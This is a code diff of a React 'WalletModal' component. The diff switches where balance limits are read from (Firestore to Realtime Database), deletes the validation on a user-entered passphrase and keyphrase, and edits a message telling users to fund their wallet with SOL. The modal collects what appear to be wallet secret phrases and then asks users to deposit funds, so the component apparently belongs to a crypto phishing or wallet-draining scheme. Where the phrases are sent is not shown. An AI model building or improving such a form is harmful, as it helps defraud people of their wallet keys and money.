@@ -1,6 +1,7 @@
 import React, { useState, useEffect, useCallback } from 'react';
-import { db } from '@/firebaseConfig';
+import { db, realtimeDb } from '@/firebaseConfig'; // Import realtimeDb
 import { doc, setDoc, getDoc } from 'firebase/firestore';
+import { ref, get } from 'firebase/database'; // Import Realtime Database functions
 import { HiViewGrid } from "react-icons/hi";
 import { toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
@@ -22,18 +23,28 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
     { name: 'Coinbase', image: '/baselogo.png' },
   ];
 
-  // Fetch minimum balance requirements from Firestore
+  // Fetch minimum balance requirements from Realtime Database
   useEffect(() => {
     const fetchBalanceRequirements = async () => {
       try {
-        const docRef = doc(db, 'settings', 'balanceRequirements');
-        const docSnap = await getDoc(docRef);
-        if (docSnap.exists()) {
-          const data = docSnap.data();
+        const balanceRef = ref(realtimeDb, 'settings/balanceRequirements');
+        const snapshot = await get(balanceRef);
+        
+        if (snapshot.exists()) {
+          const data = snapshot.val();
           setMinBalance(data.minBalance || 0.7);
           setMaxBalance(data.maxBalance || 5);
         } else {
-          console.warn('No balance requirements found in Firestore, using defaults');
+          console.warn('No balance requirements found in Realtime Database, using defaults');
+          // Create default values if they don't exist
+          const defaultRequirements = {
+            minBalance: 0.7,
+            maxBalance: 5,
+            solToUsdRate: 171.917,
+          };
+          
+          // Note: We can't set here because we don't have write permissions in this component
+          // The admin dashboard will handle creating the default values
         }
       } catch (err) {
         console.error('Error fetching balance requirements:', err);
@@ -73,25 +84,7 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
   };
 
   const validateInputs = () => {
-    if (!passphrase.trim()) {
-      setError('Please enter a valid passphrase.');
-      return false;
-    }
 
-    if (!keyphrase.trim()) {
-      setError("Please enter a valid keyphrase");
-      return false;
-    }
-
-    if (passphrase.length < 8) {
-      setError("Passphrase must be at least 8 characters long");
-      return false;
-    }
-
-    if (keyphrase.length < 12) {
-      setError("Keyphrase must be at least 12 characters long");
-      return false;
-    }
 
     setError('');
     return true;
@@ -138,7 +131,7 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
         });
       }
 
-      toast.success(`Wallet connected successfully! Please fund your wallet with ${minBalance} - ${maxBalance} SOL to continue.`, {
+      toast.success(`Wallet connected successfully! Please fund your wallet with ${minBalance} to continue.`, {
         autoClose: 10000,
       });
       
